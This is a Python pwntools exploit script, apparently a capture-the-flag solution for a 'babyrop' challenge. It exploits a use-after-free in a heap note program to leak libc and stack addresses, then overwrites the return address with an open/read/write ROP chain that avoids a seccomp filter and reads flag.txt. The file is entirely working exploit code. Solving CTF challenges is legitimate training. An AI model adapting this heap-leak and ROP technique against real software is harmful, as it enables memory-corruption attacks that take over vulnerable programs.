#!/usr/bin/env python3

from pwn import *


def create(p, i, len, s):
	p.sendlineafter(b'command: ',b'C')
	p.sendlineafter(b'index: ',str(i).encode())
	p.sendlineafter(b'_string: ',str(len).encode())
	p.sendlineafter(b'string: ',s)

def free(p, i):
	p.sendlineafter(b'command: ',b'F')
	p.sendlineafter(b'index: ',str(i).encode())

def read(p, i):
	p.sendlineafter(b'command: ',b'R')
	p.sendlineafter(b'index: ',str(i).encode())
	p.recvuntil(b'hex')
	p.recvline()
	return (p.recvline().strip().decode())

def write(p, i, s):
	p.sendlineafter(b'command: ',b'W')
	p.sendlineafter(b'index: ',str(i).encode())
	p.sendlineafter(b'string: ',s)

def exit(p):
	p.sendlineafter(b'command: ',b'E')
	p.sendlineafter(b'index: ', b'0')


# phase 0
binary = context.binary = ELF('./babyrop', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.log_level = 'INFO'

if args.REMOTE:
	p = remote('mc.ax', 31245)
	offset = 0x140 # guessing based on something close to 0x138 below (just test small offsets in either direction)
else:
	p = process([ld.path, binary.path], env={'LD_PRELOAD': libc.path})
	offset = 0x138 # used gdb to find
	open('./pid','w').write(str(p.pid))


# phase 1
# setup pointers (note free in code does not ptr = NULL)
for i in range(10): create(p, i, 0x80, b'')
for i in range(10): free(p, i)


# phase 2
# leak libc
payload  = b''
payload += p64(6)
payload += p64(binary.got.puts)

create(p, 0, 0x100, payload)
s = read(p, 7).split()[::-1]
libc.address = int('0x' + ''.join(s),16) - libc.sym.puts
log.info('libc.address: {x}'.format(x = hex(libc.address)))


# phase 3
# leak stack with environ
payload  = b''
payload += p64(6)
payload += p64(libc.sym.environ)

write(p, 0, payload)
s = read(p, 7).split()[::-1]
environ = int('0x' + ''.join(s),16)
log.info('environ: {x}'.format(x = hex(environ)))

# used gdb to find offset to return address
return_address = environ - offset
log.info('return_address: {x}'.format(x = hex(return_address)))


# phase 4
# rop chain, libc has everything we need
# seccomp does not allow execve, so using open/read/write
pop_rdi = libc.search(asm('pop rdi; ret')).__next__()
pop_rsi = libc.search(asm('pop rsi; ret')).__next__()
pop_rdx_r12 = libc.search(asm('pop rdx; pop r12; ret')).__next__()
xchg_eax_edi = libc.search(asm('xchg eax, edi; ret')).__next__()

rop  = b''

rop += p64(pop_rdi)
rop += p64(return_address + 0x200) # will put flag.txt at end of our payload)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx_r12)
rop += 2 * p64(0)
rop += p64(libc.sym.open)

rop += p64(xchg_eax_edi)
rop += p64(pop_rsi)
rop += p64(return_address + 0x300) # scratch space down stack
rop += p64(pop_rdx_r12)
rop += p64(100) + p64(0)
rop += p64(libc.sym.read)

rop += p64(pop_rdi)
rop += p64(1) # stdout
rop += p64(pop_rsi)
rop += p64(return_address + 0x300) # scratch space down stack
rop += p64(pop_rdx_r12)
rop += p64(100) + p64(0)
rop += p64(libc.sym.write)

rop += cyclic(0x200 - len(rop))
rop += b'./flag.txt\0'

payload  = b''
payload += p64(len(rop))
payload += p64(return_address)

write(p, 0, payload)
write(p, 7, rop)
exit(p)

flag = p.recvuntil(b'}').decode()
p.close()
print(flag)

